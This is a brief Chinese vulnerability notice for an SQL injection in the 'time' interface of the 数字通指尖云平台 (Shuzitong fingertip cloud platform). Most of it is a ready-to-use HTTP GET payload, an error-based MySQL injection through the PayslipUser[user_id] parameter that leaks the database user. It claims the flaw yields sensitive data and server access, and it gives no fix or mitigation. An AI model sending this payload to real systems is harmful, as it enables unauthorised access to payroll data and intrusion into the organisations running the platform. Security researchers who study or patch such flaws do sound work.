**漏洞描述：**

数字通指尖云平台time接口存在SQL注入漏洞，可通过SQL注入获取敏感信息，取得服务器权限。

**影响版本：**

数字通指间云平台

**Payload：**

```jsx
GET /payslip/search/index/userid/time?PayslipUser%5Buser_id%5D=1%20AND%20(SELECT%201111%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER()%20AS%20NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)&&yt0 HTTP/1.1
```

---
